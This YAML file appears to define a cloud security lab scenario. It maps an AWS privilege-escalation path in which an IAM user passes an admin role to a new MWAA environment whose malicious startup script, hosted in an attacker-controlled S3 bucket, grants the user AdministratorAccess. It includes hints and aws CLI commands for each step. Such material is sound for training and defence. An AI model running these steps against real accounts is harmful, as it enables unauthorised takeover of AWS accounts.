attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-mwaa-001-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole permission on the admin execution role and
        airflow:CreateEnvironment permission, enabling you to create an MWAA environment
        with an administrative execution role and a malicious startup script.

    - id: mwaa-environment
      label: "MWAA Environment"
      type: resource
      subType: mwaa-environment
      arn: "arn:aws:airflow:{region}:{account_id}:environment/pl-prod-mwaa-001-env"
      description: >
        An Amazon Managed Workflows for Apache Airflow (MWAA) environment created by
        the attacker. The environment is configured with the admin execution role and
        a malicious startup script hosted in an attacker-controlled S3 bucket. When
        the environment initializes (20-30 minutes), the startup script executes with
        the full permissions of the execution role.

    - id: admin-role
      label: "Admin Execution Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-mwaa-001-to-admin-admin-role"
      description: >
        The administrative IAM role passed to the MWAA environment as its execution
        role. The startup script executes with this role's credentials and attaches
        AdministratorAccess to the starting user, granting full administrative access
        to the AWS account.

  edges:
    - from: starting-user
      to: mwaa-environment
      label: "iam:PassRole + airflow:CreateEnvironment"
      description: >
        The attacker creates an MWAA environment, passing the admin execution role via
        iam:PassRole and specifying a malicious startup script hosted in an
        attacker-controlled S3 bucket.
      hints:
        - "You can create managed workflow environments and pass IAM roles to them."
        - "MWAA environments run a startup script before Airflow initializes — with the execution role's permissions."
        - "Host a malicious startup script in an attacker-controlled S3 bucket and pass an admin role to gain privilege escalation."
        - "Browse to https://pathfinding.cloud/paths/mwaa-001 for technique details."
      commands:
        - description: "Create the MWAA environment with the admin execution role and malicious startup script"
          command: |
            aws airflow create-environment \
              --name pl-prod-mwaa-001-env \
              --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-mwaa-001-to-admin-admin-role \
              --source-bucket-arn arn:aws:s3:::attacker-bucket \
              --dag-s3-path dags/ \
              --network-configuration SubnetIds=subnet-xxx,subnet-yyy,SecurityGroupIds=sg-xxx \
              --startup-script-s3-path s3://attacker-bucket/startup.sh

    - from: mwaa-environment
      to: admin-role
      label: "Startup script execution"
      description: >
        When the MWAA environment initializes, the startup script runs with the
        execution role's credentials and attaches AdministratorAccess to the starting
        user, completing the privilege escalation.
      hints:
        - "MWAA startup scripts run before Airflow initializes and execute as the execution role."
        - "The startup script can make any AWS API call that the execution role is permitted to make."
      commands:
        - description: "Wait for environment to reach AVAILABLE state (20-30 minutes)"
          command: |
            aws airflow get-environment --name pl-prod-mwaa-001-env \
              --query 'Environment.Status'
        - description: "Verify admin access after startup script executes"
          command: "aws iam list-users --max-items 1"
